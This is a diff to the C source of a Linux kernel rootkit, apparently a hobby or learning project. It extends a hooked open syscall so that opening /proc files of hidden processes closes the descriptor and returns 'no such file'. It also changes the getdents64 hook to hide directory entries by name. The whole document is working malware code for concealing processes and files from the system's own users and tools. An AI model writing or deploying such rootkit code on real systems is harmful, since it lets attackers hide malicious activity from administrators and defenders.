@@ -172,6 +172,8 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
 {
     long l_ret               = 0;    // Return value of the real syscall
     const char *s_filename_k = NULL; // Name of the file
+    const file_t *p_file     = NULL; // File structure representing what was opened
+    pid_t i32_found_pid      = -1;   // PID of the process found in the path, if any
 
     l_ret = orig_open(p_regs);
 
@@ -186,6 +188,32 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
     pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho) = %ld\n", s_filename_k, i32_flags, ui16_mode, l_ret);
 
     kvfree(s_filename_k);
+
+    // Check if the opened file is supposed to be hidden
+    p_file = fd_get_file(l_ret);
+
+    IF_U (IS_ERR_OR_NULL(p_file)) {
+        pr_err("[ROOTKIT] * Could not get file structure\n");
+    }
+    else {
+        IF_U (is_process_file(p_file, NULL, &i32_found_pid)) {
+            pr_info("[ROOTKIT] * Opened file is a process file\n");
+            pr_info("[ROOTKIT]   * PID: %d\n", i32_found_pid);
+
+            // Check if the process is hidden; if so, hide the file
+            IF_U (is_pid_hidden(i32_found_pid)) {
+                pr_info("[ROOTKIT]   * Hiding process file\n");
+
+                // Close the file descriptor
+                close_fd(l_ret);
+
+                return -ENOENT; // No such file or directory
+            }
+        }
+        else {
+            pr_info("[ROOTKIT] * Opened file is not a process file\n");
+        }
+    }
 
     return l_ret;
 }
@@ -355,7 +383,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
         us_reclen = p_dirent_it->d_reclen;
 
         // Check if the current directory entry has to be hidden
-        IF_U (is_dirent_hidden(p_dirent_it, b_is_proc_root)) {
+        IF_U (is_file_hidden(p_dirent_it->d_name, b_is_proc_root)) {
             pr_info("[ROOTKIT]     * Hiding directory entry\n");
 
             IF_L ((char *)p_dirent_it + us_reclen < (char *)p_dirent_k + l_ret) {
